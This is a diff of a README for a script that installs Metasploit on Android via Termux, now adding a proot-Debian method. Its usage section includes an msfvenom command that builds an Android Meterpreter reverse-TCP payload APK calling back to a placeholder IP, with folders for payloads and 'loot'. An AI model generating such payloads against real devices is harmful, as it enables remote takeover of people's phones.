@@ -7,9 +7,9 @@
   <img src="https://user-images.githubusercontent.com/46929618/154997514-8bd1d6c6-6b3d-4251-a6ce-6b8bceb22b06.png" width="100%" alt="Banner">
 </p>
 <p align="center">
-<img title="Version" src="https://img.shields.io/badge/Version-2.5.0-green.svg?style=flat-square">
+<img title="Version" src="https://img.shields.io/badge/Version-3.0.0-green.svg?style=flat-square">
 <img title="Maintainence" src="https://img.shields.io/badge/Maintained%3F-yes-green.svg?style=flat-square">
-<img title="Ruby" src="https://img.shields.io/badge/Ruby-3.4.0%20Compatible-red.svg?style=flat-square">
+<img title="Proot" src="https://img.shields.io/badge/Method-Proot--Distro-blue.svg?style=flat-square">
 <img title="License" src="https://img.shields.io/badge/License-GNU-blue.svg?style=flat-square">
 </p>
 <p align="center">
@@ -20,19 +20,37 @@
 ---
 
 ### 🛡️ ABOUT THE TOOL
-Since Metasploit was removed from the official Termux repositories, installing it has become difficult. This advanced script automates the installation of the latest **Metasploit-Framework** and specifically fixes the common **Nokogiri/Gumbo** compilation errors found in newer Ruby versions.
+Since Metasploit was removed from the official Termux repositories, installing it has become difficult due to **Ruby gem compilation errors** (Nokogiri/Gumbo). This script now supports three installation methods, including the **recommended proot-distro approach** which completely bypasses all gem errors.
 
-### 🚀 FEATURES
-* **[+]** Automatic Ruby 3.4.0 Gumbo Header Patch.
-* **[+]** Optimized for ARM/ARM64 architectures.
-* **[+]** Silent installation mode (logs errors to `install.log`).
-* **[+]** Auto-initialization of PostgreSQL Database.
-* **[+]** Stale PID cleanup (Fixes "Could not start server" errors).
+---
+
+### ✅ INSTALLATION METHODS
+
+| Method | Android | Stability | Size | Recommended |
+|--------|---------|-----------|------|-------------|
+| **Proot-Distro (Debian)** | 7.0+ | ⭐⭐⭐⭐⭐ | ~300MB | ✅ YES |
+| Direct Install (Modern) | 7.0+ | ⭐⭐⭐ | ~150MB | ⚠️ May have gem errors |
+| Legacy Install | 4.4-6.0 | ⭐⭐ | ~150MB | ❌ Old MSF version |
+
+---
+
+### 🚀 FEATURES (Proot Method)
+* **[+]** Zero Ruby gem compilation — uses Rapid7 official pre-built package.
+* **[+]** Lightweight Debian (~300MB) — not heavy Kali Linux.
+* **[+]** `/sdcard` auto-mounted — save payloads directly to phone storage.
+* **[+]** PostgreSQL auto-configured inside Debian.
+* **[+]** Three launchers: `msfconsole`, `msfvenom`, `msf-shell`.
+* **[+]** Update MSF anytime with `apt upgrade` inside Debian.
+
+---
 
 ### 🛠️ REQUIREMENTS
 * Termux (Latest version from F-Droid)
 * Minimum 2GB Internal Storage
 * Stable Internet Connection
+* Android 7.0+ (for proot method)
+
+---
 
 ### 📥 INSTALLATION
 
@@ -44,7 +62,7 @@ apt update && apt upgrade -y
 apt install git -y
 
 # Clone the repository
-git clone [https://github.com/h4ck3r0/Metasploit-termux](https://github.com/h4ck3r0/Metasploit-termux)
+git clone https://github.com/h4ck3r0/Metasploit-termux
 
 # Enter directory
 cd Metasploit-termux
@@ -56,28 +74,58 @@ chmod +x *
 bash metasploit.sh
 ```
 
+> **Choose Option 3 → Proot-Distro (Recommended)**
+
+---
 
 ### 🎮 USAGE
 
-After successful installation, simply type:
-
 ```bash
+# Launch Metasploit console
 msfconsole
 
+# Generate payloads (saves to /sdcard/MSF/payloads/ by default)
+msfvenom -p android/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 \
+  -o /sdcard/MSF/payloads/payload.apk
+
+# Enter Debian shell (to build tools, copy files, etc.)
+msf-shell
 ```
 
-For payload generation:
+---
+
+### 📁 FILE ACCESS & STORAGE
+
+Files built inside the Debian proot can be copied to your phone storage easily:
 
 ```bash
-msfvenom
+# From inside Debian (msf-shell), /sdcard is mounted:
+cp /root/mytool.apk /sdcard/MSF/mytool.apk
 
+# Access from Android: Internal Storage → MSF → payloads/
 ```
+
+**Auto-mounted paths inside Debian:**
+| Debian Path | Points To |
+|-------------|-----------|
+| `/sdcard/` | Phone internal storage |
+| `/sdcard/MSF/payloads/` | Payload output folder |
+| `/sdcard/MSF/loot/` | Loot/data folder |
+| `/root/msf-output/` | Alias for `/sdcard/MSF/` |
 
 ---
 
 ### 📢 IMPORTANT NOTICE
 
-Metasploit is resource-intensive. If the process is killed by Android, ensure you have disabled "Battery Optimization" for Termux.
+Metasploit is resource-intensive. If the process is killed by Android:
+- Disable **Battery Optimization** for Termux in Android settings
+- Enable **Phantom Process Killer** workaround for Android 12+:
+  ```bash
+  adb shell device_config set_sync_disabled_for_tests persistent
+  adb shell device_config put activity_manager max_phantom_processes 2147483647
+  ```
+
+---
 
 ### 🌐 CONNECT WITH US
 
